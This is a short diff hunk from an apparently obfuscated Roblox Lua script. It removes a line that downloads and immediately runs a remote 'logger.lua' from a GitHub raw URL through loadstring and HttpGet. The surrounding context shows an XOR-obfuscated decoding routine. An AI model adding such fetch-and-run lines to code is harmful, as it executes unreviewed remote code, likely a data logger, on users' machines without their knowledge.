@@ -14410,4 +14410,5 @@ local function tkFXxk() local k=72; local r={}; for i=1,#bFkmY do local b=(bFkmY
 
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/tola66/DermoLoder/refs/heads/main/logger.lua"))()
+
+
